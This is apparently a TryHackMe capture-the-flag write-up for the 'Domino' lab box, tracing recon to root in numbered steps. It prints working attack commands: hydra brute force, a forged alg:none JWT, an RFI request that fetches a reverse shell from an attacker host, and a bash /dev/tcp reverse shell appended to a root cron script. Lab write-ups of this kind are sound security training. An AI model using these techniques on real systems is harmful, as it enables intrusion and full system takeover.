TryHackMe — Domino

Full web exploitation chain on a Linux box — JS recon to root in 8 steps. Covers AES-ECB decryption, credential brute force, IDOR, XSS cookie hijack, JWT algorithm confusion, remote file inclusion, and cron-based privilege escalation. 5 / 5 flags.

TryHackMe Medium 5 / 5 Flags Linux Boot2Root

// 01 — recon

Nmap revealed two open ports — SSH (22) and Apache HTTP (80). Attack surface is entirely web-based.

nmap -sC -sV -p- <target-ip>

Gobuster found five key directories: /backup, /admin, /api, /support, and /static.

gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

// 02 — JS recon & AES-ECB decryption

Reviewing /static/app.js revealed a hardcoded AES-128-ECB encryption key left in a TODO comment by a developer named Laura:

// Key: N3xusK3y2024!! (pad to 16 bytes with \x00) _backupKey: 'N3xusK3y2024!!'

The /backup/ endpoint exposed config.enc. The key is 14 bytes — padded with 2 null bytes, then converted to hex and decrypted:

openssl enc -d -aes-128-ecb -nosalt -nopad \ -K 4e337875734b33793230323421210000 \ -in config.enc
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}

Key finding: system_user: devops — a valid system account for later SSH pivot.

CWE-321Hardcoded KeyAES-ECB

// 03 — username enum & credential brute force

The /admin/ login page used a firstname.lastname username format. The /team.php page exposed all 7 employee names and emails. The forgot password endpoint confirmed accounts via differing error messages — classic user enumeration.

hydra -q -u -L usernames.txt \ -P /usr/share/wordlists/rockyou.txt <target-ip> \ http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials"

Three accounts cracked — all sharing the password password: robert.wilson, sarah.johnson, emma.taylor.

User EnumerationWeak Passwords

// 04 — IDOR → flag 1

Logged in as robert.wilson. The dashboard linked to /api/users/profile.php?id=4. Robert was the 4th employee — IDs were sequential. Changing to ?id=1 returned Laura Hayes' (CIO) profile, including a notes field containing Flag 1.

IDORBroken Access Control

// 05 — XSS cookie hijack → flag 2

An admin bot (/opt/admin_bot.py) polls support tickets every 15 seconds, extracts URLs from message bodies, and visits them using Laura Hayes' admin session cookie. With HttpOnly: false, the cookie was accessible via the HTTP request headers.

Created a support ticket with a URL pointing to a Netcat listener:

nc -lvnp 8888

Within 15 seconds the bot visited the URL. The listener captured the raw HTTP request including Laura's nexus_session cookie. Swapping it in the browser granted access to /admin/index.php, revealing Flag 2 under System Status.

Stored XSSSession HijackingHttpOnly: false

// 06 — JWT alg:none bypass

The File Viewer API required a JWT from /api/auth/token.php. The payload contained "role":"user" and the API rejected non-admin requests. Testing the alg:none vulnerability — the server trusted the algorithm field in the token header without validation:

H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=') P=$(echo -n '{"sub":"robert.wilson","role":"admin","iat":...,"exp":...}' | base64 | tr '+/' '-_' | tr -d '=') echo "$H.$P."

The server accepted the unsigned forged token, confirming it never verified the signature.

JWT Algorithm ConfusionSignature Not Verified

// 07 — RFI → reverse shell → flag 3

Reading the source of /api/files.php via the file API revealed a critical code path — the endpoint fetches any remote URL and passes it through eval():

if (strpos($name, "http://") === 0) { $remote = @file_get_contents($name); eval(str_replace("<?php", "", $remote)); }

Hosted a modified pentestmonkey/php-reverse-shell on a Python HTTP server, started a Netcat listener, and triggered the RFI:

curl -H "Authorization: Bearer <forged_jwt>" \ "http://<target>/api/files.php?name=http://<attacker>/shell.php"

Reverse shell received as www-data. Flag 3 at /opt/flag3.txt.

RFIeval() on remote inputRCE

// 08 — cleartext creds → devops → flag 4

Enumerating /var/www/html/ revealed an obscurely named PHP MySQL admin file containing hardcoded database credentials:

'user' => "app_user" 'pwd' => "D3v0ps!2024"
su devops # password: D3v0ps!2024

Flag 4 at /home/devops/user.txt.

Cleartext CredentialsPassword Reuse

// 09 — writable cron script → root → flag 5

pspy64 from /opt/tools/ revealed root running /opt/monitoring/health_report.sh every minute. The devops group had write access (-rwxrwxr--). Appended a bash reverse shell:

echo 'bash -i >& /dev/tcp/<attacker>/5555 0>&1' \ >> /opt/monitoring/health_report.sh

Root shell received within one minute. Flag 5 at /root/root.txt.

Writable Cron ScriptPrivilege Escalation
